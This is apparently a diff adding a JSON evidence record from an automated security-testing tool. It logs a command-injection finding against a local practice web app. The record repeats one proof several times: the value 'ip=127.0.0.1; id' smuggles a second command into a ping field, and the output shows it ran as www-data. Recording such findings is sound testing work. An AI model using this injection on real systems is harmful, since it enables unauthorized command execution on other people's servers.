@@ -1,0 +1,24 @@
+{
+  "id": "ev_1784861882134_9f53dc",
+  "type": "tool_output",
+  "source_tool": "finding",
+  "summary": "Command Execution (RCE) in /vulnerabilities/exec/ @ http://127.0.0.1:8080/vulnerabilities/exec/",
+  "data": {
+    "kind": "proof",
+    "observation": "POST ip=127.0.0.1; id executes the id command showing uid=33(www-data) gid=33(www-data) groups=33(www-data). The ping output shows: PING 127.0.0.1 (127.0.0.1): 56 data bytes; 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.096 ms",
+    "proof": "POST ip=127.0.0.1; id executes the id command showing uid=33(www-data) gid=33(www-data) groups=33(www-data). The ping output shows: PING 127.0.0.1 (127.0.0.1): 56 data bytes; 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.096 ms",
+    "path_or_url": "http://127.0.0.1:8080/vulnerabilities/exec/",
+    "location": "http://127.0.0.1:8080/vulnerabilities/exec/",
+    "title": "Command Execution (RCE) in /vulnerabilities/exec/",
+    "stdout": "POST ip=127.0.0.1; id executes the id command showing uid=33(www-data) gid=33(www-data) groups=33(www-data). The ping output shows: PING 127.0.0.1 (127.0.0.1): 56 data bytes; 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.096 ms",
+    "body_preview": "POST ip=127.0.0.1; id executes the id command showing uid=33(www-data) gid=33(www-data) groups=33(www-data). The ping output shows: PING 127.0.0.1 (127.0.0.1): 56 data bytes; 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.096 ms",
+    "capture_via": "write",
+    "how_captured": "script: proof_command_exec.txt",
+    "script_path": "proof_command_exec.txt",
+    "path": "proof_command_exec.txt",
+    "script_preview": "POST ip=127.0.0.1; id executes the id command showing uid=33(www-data) gid=33(www-data) groups=33(www-data). The ping output shows: PING 127.0.0.1 (127.0.0.1): 56 data bytes; 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.096 ms",
+    "source_tool_act": "write",
+    "act_summary": "source/material proof_command_exec.txt"
+  },
+  "created_at": "2026-07-24T02:58:02.134Z"
+}
